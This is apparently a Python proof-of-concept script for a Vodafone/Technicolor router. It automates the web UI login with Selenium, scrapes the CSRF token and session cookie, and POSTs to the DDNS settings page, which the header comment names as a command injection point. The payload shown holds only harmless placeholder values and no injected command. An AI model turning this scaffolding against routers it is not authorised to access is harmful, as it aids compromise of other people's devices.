# Proof of concept to use selenium to log in and grab CSRFtoken, then use python requests to submit command injection POSTS to do good things
# https://github.com/jameskeenan295/tch_selenium_ddns_injection

from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from bs4 import BeautifulSoup
import requests

delay = 10 # web request timeout in seconds
webUI_username = "vodafone"
webUI_password = "theactualpassword"
webUI_IPaddress = "192.168.1.1"
webUI_ddnsurl = 'http://%s/modals/dns-ddns.lp' % webUI_IPaddress

driver = webdriver.Firefox()
driver.set_window_size(1024, 768)
print("Sending initial GET request for webUI login page http://%s" % webUI_IPaddress)
driver.get("http://%s" % webUI_IPaddress)
print("Waiting for webUI login page to load")
(WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.ID, 'login-txt-uname')))).send_keys(webUI_username)
(WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.ID, 'login-txt-pwd')))).send_keys(webUI_password)

print("Found the username & password fields, set them successfully. Now submitting")
driver.find_element_by_id("login-btn-logIn").click()
print("Submit Successful, waiting for webUI home page to load before scraping CSRFtoken")

WebDriverWait(driver, delay).until(EC.presence_of_element_located((By.XPATH, "//div[@id=\'home_sel_mode_chosen\']/a/span")))

soup = BeautifulSoup(driver.page_source, 'html.parser')
csrftoken = soup.find('input', {'name': 'CSRFtoken'}).get('value')
sessionID = driver.get_cookie('sessionID').get('value')
print("CSRFtoken = ", csrftoken)
print("SessionID = ", sessionID)

session1 = requests.session()
cookie1 = requests.cookies.create_cookie('sessionID', sessionID)
session1.cookies.set_cookie(cookie1)
cookie2 = requests.cookies.create_cookie('webui_language', 'en-us')
session1.cookies.set_cookie(cookie2)

httpheaders={
    'referer': 'http://%s/' % webUI_IPaddress,
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:68.0) Gecko/20100101 Firefox/68.0',
    'Accept': 'text/css,*/*;q=0.1',
    'Accept-Language': 'en-GB,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive'
    }

payload = {
    'ddnsStatus': '1',
    'ddnsService': 'dyndns.org',
    'ddnsDomain': 'test.com',
    'ddnsUsrname': 'admin',
    'ddnsPswrd': 'notarealpassword',
    'securedns': '0',
    'action': 'SAVE',
    'CSRFtoken': csrftoken    
    }
httpresponse = session1.post(webUI_ddnsurl, headers=httpheaders, data=payload)

print("Done")
